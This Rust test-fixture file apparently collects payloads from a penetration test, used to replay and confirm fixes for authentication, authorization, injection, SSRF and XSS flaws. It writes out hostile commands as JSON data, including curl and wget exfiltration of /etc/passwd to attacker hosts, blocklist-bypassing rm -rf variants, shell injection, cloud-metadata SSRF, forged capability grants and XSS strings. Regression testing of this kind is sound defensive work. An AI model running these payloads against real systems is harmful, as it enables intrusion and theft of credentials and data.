//! Shannon pentest attack payloads — extracted from zp-external-audit-8.
//!
//! Each constant represents an exact or closely-derived payload from the
//! Shannon pentest deliverables. The payloads are organized by VULN-TRACKER
//! category: AUTH, AUTHZ, INJ, SSRF, XSS.
//!
//! These payloads are used by the regression replay tests to verify that
//! each vulnerability is closed. Before the fix lands, the corresponding
//! test MUST FAIL (Shannon succeeded). After the fix, it MUST PASS.

use serde_json::json;

// ============================================================================
// AUTH-VULN payloads — Authentication bypass
// ============================================================================

/// AUTH-VULN-01: All API endpoints accessible without any credentials.
/// Shannon simply curled every endpoint and got 200s back.
pub mod auth {
    /// Endpoints that should require authentication (non-exhaustive sample
    /// of the most dangerous ones).
    pub const PROTECTED_ENDPOINTS_GET: &[&str] = &[
        "/api/v1/identity",
        "/api/v1/audit/entries",
        "/api/v1/audit/chain-head",
        "/api/v1/audit/verify",
        "/api/v1/security/posture",
        "/api/v1/security/topology",
        "/api/v1/tools",
        "/api/v1/stats",
        "/api/v1/genesis",
        "/api/v1/attestations/all",
        "/api/v1/codebase/tree",
        "/api/v1/system/state",
        "/api/v1/analysis/index",
    ];

    pub const PROTECTED_ENDPOINTS_POST: &[&str] = &[
        "/api/v1/evaluate",
        "/api/v1/capabilities/grant",
        "/api/v1/capabilities/delegate",
        "/api/v1/capabilities/verify-chain",
        "/api/v1/audit/clear",
        "/api/v1/audit/simulate-tamper",
        "/api/v1/audit/restore",
        "/api/v1/receipts/generate",
        "/api/v1/tools/launch",
        "/api/v1/tools/stop",
        "/api/v1/attestations",
        "/api/v1/analytics/event",
    ];

    /// Endpoints that SHOULD be accessible without auth (health, root, onboard).
    pub const EXEMPT_ENDPOINTS: &[&str] = &[
        "/api/v1/health",
        "/",
    ];
}

// ============================================================================
// INJ-VULN payloads — Command & path injection
// ============================================================================

pub mod injection {
    use serde_json::json;

    /// INJ-VULN-01: Double-space blocklist bypass.
    /// Shannon discovered that `rm  -rf /` (double space) bypassed the
    /// substring-match blocklist that only checked for `rm -rf /`.
    pub fn double_space_bypass() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "rm  -rf /tmp/test",
            "cwd": "."
        })
    }

    /// INJ-VULN-01 variant: tab character bypass.
    pub fn tab_bypass() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "rm\t-rf /tmp/test",
            "cwd": "."
        })
    }

    /// INJ-VULN-02: make in attacker-controlled cwd.
    /// Shannon registered a tool at a path containing a malicious Makefile,
    /// then ran `make` via exec_ws with cwd set to that path.
    pub fn make_in_attacker_cwd() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "make",
            "cwd": "/tmp/attacker-controlled"
        })
    }

    /// INJ-VULN-02 variant: cargo run in attacker cwd.
    pub fn cargo_run_attacker_cwd() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "cargo run",
            "cwd": "/tmp/attacker-controlled"
        })
    }

    /// INJ-VULN-03: Path traversal via unrestricted cwd.
    /// Shannon set cwd to `../../etc` and listed sensitive files.
    pub fn path_traversal_cwd() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "ls -la",
            "cwd": "../../etc"
        })
    }

    /// INJ-VULN-03 variant: absolute path to system root.
    pub fn absolute_system_path() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "cat /etc/passwd",
            "cwd": "/"
        })
    }

    /// INJ-VULN-04: curl-based file exfiltration.
    /// Shannon used curl to POST local files to an attacker server.
    pub fn curl_exfiltration() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "curl -X POST -d @/etc/passwd http://attacker.example.com/exfil",
            "cwd": "."
        })
    }

    /// INJ-VULN-04 variant: wget exfiltration.
    pub fn wget_exfiltration() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "wget --post-file=/etc/passwd http://attacker.example.com/exfil",
            "cwd": "."
        })
    }

    /// INJ-VULN-05: Unauth scan_path traversal via onboard WebSocket.
    /// Shannon sent a configure action with scan_path set to /etc.
    pub fn onboard_scan_path_traversal() -> serde_json::Value {
        json!({
            "action": "configure",
            "scan_path": "/etc"
        })
    }

    /// INJ-VULN-05 variant: home directory traversal.
    pub fn onboard_scan_dotfiles() -> serde_json::Value {
        json!({
            "action": "configure",
            "scan_path": "~/.ssh"
        })
    }

    /// Shell metacharacter injection — semicolon chaining.
    pub fn semicolon_chain() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "echo hello; cat /etc/passwd",
            "cwd": "."
        })
    }

    /// Shell metacharacter injection — backtick substitution.
    pub fn backtick_injection() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "echo `cat /etc/passwd`",
            "cwd": "."
        })
    }

    /// Shell metacharacter injection — $() substitution.
    pub fn dollar_paren_injection() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "echo $(cat /etc/passwd)",
            "cwd": "."
        })
    }

    /// Shell metacharacter injection — pipe to external.
    pub fn pipe_to_external() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "cat /etc/passwd | curl -X POST -d @- http://evil.com",
            "cwd": "."
        })
    }
}

// ============================================================================
// SSRF-VULN payloads — Server-side request forgery
// ============================================================================

pub mod ssrf {
    use serde_json::json;

    /// SSRF-VULN-01: Full SSRF via exec curl to internal services.
    /// Shannon curled the cloud metadata endpoint via exec_ws.
    pub fn cloud_metadata_curl() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "curl http://169.254.169.254/latest/meta-data/",
            "cwd": "."
        })
    }

    /// SSRF-VULN-01 variant: wget to internal network.
    pub fn internal_network_wget() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "wget -qO- http://10.0.0.1:8080/admin",
            "cwd": "."
        })
    }

    /// SSRF-VULN-01 variant: curl to localhost services.
    pub fn localhost_probe() -> serde_json::Value {
        json!({
            "action": "exec",
            "cmd": "curl http://127.0.0.1:6379/INFO",
            "cwd": "."
        })
    }
}

// ============================================================================
// AUTHZ-VULN payloads — Authorization bypass
// ============================================================================

pub mod authz {
    use serde_json::json;

    /// AUTHZ-VULN-03: Unauthenticated audit trail destruction.
    /// Shannon POSTed to /api/v1/audit/clear with no credentials.
    pub fn audit_clear() -> serde_json::Value {
        json!({})
    }

    /// AUTHZ-VULN-04: Unauthenticated audit chain corruption.
    /// Shannon POSTed to /api/v1/audit/simulate-tamper and /restore.
    pub fn audit_simulate_tamper() -> serde_json::Value {
        json!({ "entry_index": 0, "new_data": "corrupted" })
    }

    pub fn audit_restore() -> serde_json::Value {
        json!({})
    }

    /// AUTHZ-VULN-05: Unauthenticated capability grant.
    /// Shannon POSTed a capability grant with no credentials.
    pub fn unauth_capability_grant() -> serde_json::Value {
        json!({
            "resource": "system:*",
            "action": "admin:*",
            "grantee": "attacker-node-id",
            "trust_tier": 3,
            "expires_in_secs": 86400
        })
    }

    /// AUTHZ-VULN-16: Ownership-free capability delegation.
    /// Shannon delegated a capability without being the holder.
    pub fn ownership_free_delegation() -> serde_json::Value {
        json!({
            "grant_id": "fake-grant-id",
            "delegate_to": "attacker-node-id",
            "subset": {
                "resource": "system:*",
                "action": "admin:*"
            }
        })
    }

    /// AUTHZ-VULN-17: Disabled signature verification.
    /// Shannon sent a chain with invalid signatures; server reported verified:true.
    pub fn forged_delegation_chain() -> serde_json::Value {
        json!({
            "chain": [
                {
                    "grant_id": "forged-001",
                    "resource": "system:*",
                    "action": "admin:*",
                    "grantor": "fake-grantor",
                    "grantee": "attacker",
                    "signature": "0000000000000000000000000000000000000000000000000000000000000000"
                }
            ]
        })
    }

    /// AUTHZ-VULN-19: Unauthenticated credential injection via onboard WS.
    /// Shannon sent vault_store via the onboard WebSocket without any auth.
    pub fn onboard_vault_store() -> serde_json::Value {
        json!({
            "action": "vault_store",
            "provider": "openai",
            "key": "sk-attacker-injected-key-12345"
        })
    }

    /// AUTHZ-VULN-20: Onboard configure with arbitrary scan path.
    pub fn onboard_arbitrary_scan() -> serde_json::Value {
        json!({
            "action": "configure",
            "scan_path": "/",
            "tool_name": "exploit"
        })
    }
}

// ============================================================================
// XSS-VULN payloads — Cross-site scripting via stored data
// ============================================================================

pub mod xss {
    use serde_json::json;

    /// XSS-VULN-01/06/09: tool.name containing script tag.
    /// Shannon registered a tool with a name containing XSS payload.
    /// The dashboard, ecosystem page, and onboard scan all rendered it
    /// unsanitized into innerHTML.
    pub fn xss_tool_name() -> String {
        r#"<img src=x onerror=alert('XSS-VULN-01')>"#.to_string()
    }

    /// XSS payload for tool registration via configure.
    pub fn onboard_configure_xss() -> serde_json::Value {
        json!({
            "action": "configure",
            "scan_path": "/tmp",
            "tool_name": "<img src=x onerror=alert('XSS')>"
        })
    }

    /// Content-Security-Policy header that should be present on all responses.
    /// Phase 0.6 adds this. Tests verify its presence.
    pub const EXPECTED_CSP: &str = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' ws://localhost:* wss://localhost:*";
}
